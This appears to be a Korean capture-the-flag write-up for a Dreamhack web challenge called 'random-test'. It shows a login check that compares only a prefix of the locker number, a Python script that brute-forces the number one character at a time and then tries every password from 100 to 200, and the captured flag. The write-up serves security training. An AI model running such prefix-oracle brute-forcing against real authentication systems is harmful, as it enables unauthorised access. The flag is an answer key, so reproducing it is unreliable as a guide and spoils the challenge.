# random-test

### 1. VM에 접속한다

사물함 번호와 자물쇠 비밀번호를 입력하는 페이지를 확인한다.

### 2. 코드 분석

문제에서 제공한 `random-test`의 `app.py`에서는 랜덤한 사물함 번호와 비밀번호를 생성한다.

```python
rand_str = ""
alphanumeric = string.ascii_lowercase + string.digits
for i in range(4):
    rand_str += str(random.choice(alphanumeric))

rand_num = random.randint(100, 200)
```

`random.choice(alphanumeric)`로 영어 소문자와 숫자 중 한 글자를 무작위로 선택해 4번 이어 붙인다. 따라서 `rand_str`은 랜덤한 4자리 문자열이고, `rand_num`은 100부터 200 사이의 랜덤 정수다.

```python
if locker_num != "" and rand_str[0:len(locker_num)] == locker_num:
    if locker_num == rand_str and password == str(rand_num):
        return render_template("index.html", result = "FLAG:" + FLAG)
```

`rand_str[0:len(locker_num)]`는 입력한 길이만큼만 정답의 앞부분을 비교한다. 따라서 처음 한 글자만 일치해도 서버가 `Good`을 반환하며, 번호 네 자리와 비밀번호가 모두 일치할 때 `FLAG`가 출력된다.

**이 조건을 이용하면 `Good` 응답으로 사물함 번호를 한 글자씩 찾을 수 있다.**

### 3. 사물함 번호와 비밀번호 찾기

영문 소문자와 숫자를 순서대로 대입하여 사물함 번호를 찾고, 비밀번호 100~200을 검사한다.

```python
import string
import requests

URL = "http://host3.dreamhack.games:12112/"
locker = ""

for _ in range(4):
    for c in string.ascii_lowercase + string.digits:
        candidate = locker + c
        r = requests.post(URL, data={"locker_num": candidate, "password": ""})
        if "Good" in r.text:
            locker = candidate
            break
    else:
        raise RuntimeError("번호를 찾지 못함")

print("사물함 번호:", locker)
for password in range(100, 201):
    r = requests.post(URL, data={"locker_num": locker, "password": str(password)})
    if "FLAG:" in r.text:
        print("비밀번호:", password)
        print(r.text)
        break
```

사물함 번호는 **`9yuy`**, 비밀번호는 **`161`**이었다.

### 4. FLAG를 확인한다

![random-test FLAG 확인 화면](../assets/random-test.png)

FLAG: `DH{2e583205a2555b8890d141b51cee41379cead9a65a957e72d4a99568c0a2f955}`
